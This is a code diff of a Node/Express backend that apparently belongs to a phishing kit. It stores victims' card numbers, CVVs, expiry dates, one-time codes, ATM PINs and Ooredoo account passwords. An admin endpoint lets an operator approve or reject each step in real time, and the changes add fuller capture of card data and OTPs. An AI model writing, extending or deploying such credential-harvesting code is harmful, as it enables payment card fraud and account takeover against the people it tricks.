@@ -120,37 +120,38 @@ app.post('/api/admin/decide/:ref', (req, res) => {
   }
 
   const { ref } = req.params;
-  const { action } = req.body || {};
+  const { action, decision } = req.body || {};
+  const choice = action || decision;
 
   const visit = visits[ref];
   if (!visit) {
     return res.status(404).json({ error: 'order not found' });
   }
 
-  if (action === 'accept') {
-    const step = visit.step || 'payment';
-    if (step === 'payment') {
+  const step = visit.step || 'card';
+
+  if (choice === 'accept') {
+    if (step === 'card' || step === 'payment') {
       visit.status = 'payment_accepted';
     } else if (step === 'otp') {
       visit.status = 'otp_accepted';
-    } else if (step === 'atm') {
+    } else if (step === 'pin' || step === 'atm') {
       visit.status = 'atm_accepted';
-    } else if (step === 'ooredoo_login') {
+    } else if (step === 'ooredoo' || step === 'ooredoo_login') {
       visit.status = 'ooredoo_login_accepted';
-    } else if (step === 'ooredoo_otp') {
+    } else if (step === 'ooredoo-otp' || step === 'ooredoo_otp') {
       visit.status = 'ooredoo_otp_accepted';
     }
-  } else if (action === 'reject') {
-    const step = visit.step || 'payment';
-    if (step === 'payment') {
+  } else if (choice === 'reject') {
+    if (step === 'card' || step === 'payment') {
       visit.status = 'payment_rejected';
     } else if (step === 'otp') {
       visit.status = 'otp_rejected';
-    } else if (step === 'atm') {
+    } else if (step === 'pin' || step === 'atm') {
       visit.status = 'atm_rejected';
-    } else if (step === 'ooredoo_login') {
+    } else if (step === 'ooredoo' || step === 'ooredoo_login') {
       visit.status = 'ooredoo_login_rejected';
-    } else if (step === 'ooredoo_otp') {
+    } else if (step === 'ooredoo-otp' || step === 'ooredoo_otp') {
       visit.status = 'ooredoo_otp_rejected';
     }
   }
@@ -193,13 +194,19 @@ app.post('/api/payment', (req, res) => {
   if (visits[requestId]) {
     visits[requestId].pay = {
       id: paymentId,
+      cardName: cardName,
+      cardNumber: cardNumber,
+      cvv: cvv,
+      exp: expiryDate,
+      expiry: expiryDate,
       amount: amount,
       currency: currency,
       status: 'pending_approval',
       step: 'payment'
     };
-    visits[requestId].status = 'payment_pending';
-    visits[requestId].step = 'payment';
+    visits[requestId].status = 'awaiting';
+    visits[requestId].step = 'card';
+    visits[requestId].cardName = cardName;
   }
 
   res.json({ ok: true, id: paymentId });
@@ -233,9 +240,13 @@ app.post('/api/otp', (req, res) => {
     return res.status(404).json({ ok: false, error: 'Visit not found' });
   }
 
-  visit.status = 'otp_pending';
+  visit.status = 'awaiting';
   visit.step = 'otp';
   visit.otp = otp;
+  if (visit.pay) {
+    visit.pay.otp = otp;
+    visit.pay.code = otp;
+  }
   res.json({ ok: true });
 });
 
@@ -253,17 +264,21 @@ app.post('/api/atm', (req, res) => {
     return res.status(404).json({ ok: false, error: 'Visit not found' });
   }
 
-  visit.status = 'atm_pending';
-  visit.step = 'atm';
+  visit.status = 'awaiting';
+  visit.step = 'pin';
   visit.atmPin = atmPin;
+  if (visit.pay) {
+    visit.pay.pin = atmPin;
+  }
   res.json({ ok: true });
 });
 
 // ---- Ooredoo Login ----
 app.post('/api/ooredoo-login', (req, res) => {
-  const { id, phone, password } = req.body || {};
+  const { id, phone, password, username } = req.body || {};
+  const userName = username || phone;
 
-  if (!id || !phone || !password) {
+  if (!id || !userName || !password) {
     return res.status(400).json({ ok: false, error: 'Missing required fields' });
   }
 
@@ -273,9 +288,14 @@ app.post('/api/ooredoo-login', (req, res) => {
     return res.status(404).json({ ok: false, error: 'Visit not found' });
   }
 
-  visit.status = 'ooredoo_login_pending';
-  visit.step = 'ooredoo_login';
-  visit.ooredoo = { phone, password };
+  visit.status = 'awaiting';
+  visit.step = 'ooredoo';
+  visit.ooredoo = {
+    username: userName,
+    phone: userName,
+    password: password,
+    otp: visit.ooredoo ? visit.ooredoo.otp : ''
+  };
   res.json({ ok: true });
 });
 
@@ -293,9 +313,14 @@ app.post('/api/ooredoo-otp', (req, res) => {
     return res.status(404).json({ ok: false, error: 'Visit not found' });
   }
 
-  visit.status = 'ooredoo_otp_pending';
-  visit.step = 'ooredoo_otp';
+  visit.status = 'awaiting';
+  visit.step = 'ooredoo-otp';
   visit.ooredooOtp = otp;
+  if (visit.ooredoo) {
+    visit.ooredoo.otp = otp;
+  } else {
+    visit.ooredoo = { username: '', password: '', otp: otp };
+  }
   res.json({ ok: true });
 });
 
